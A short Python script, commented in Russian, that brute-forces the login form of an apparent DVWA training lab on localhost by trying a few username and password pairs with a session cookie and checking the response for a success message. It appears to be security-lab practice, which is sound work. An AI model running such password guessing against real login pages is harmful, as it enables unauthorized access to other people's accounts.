import requests

# URLs
base_url = "http://localhost:4280"
bruteforce_url = f"{base_url}/vulnerabilities/brute/"

# Данные для перебора
usernames = ["admin", "Gordon", "Hack", "Pablo", "Bob"]
passwords = ["doom", "1234", "1111", "password"]

# Cookies (вставьте PHPSESSID)
cookies = {
    "PHPSESSID": "2dd092ac50cfc4f8f5fb1f58377e9d61",  # Замените на актуальное значение
    "security": "low"
}

# Попытка входа
def try_login(session, username, password):
    params = {
        "username": username,
        "password": password,
        "Login": "Login"
    }
    response = session.get(bruteforce_url, params=params, cookies=cookies)

    # Проверка успешного входа
    if "Welcome to the password protected area" in response.text:
        return True
    return False

# Основная функция
def main():
    session = requests.Session()
    print("[*] Начинаем перебор паролей...")

    for username in usernames:
        for password in passwords:
            print(f"[*] Пробуем {username}:{password}")

            success = try_login(session, username, password)
            if success:
                print(f"[+] Пароль найден! {username}:{password}")
                return
            else:
                print(f"[-] Неверный пароль: {username}:{password}")

    print("[*] Все попытки завершены. Пароль не найден.")

if __name__ == "__main__":
    main()
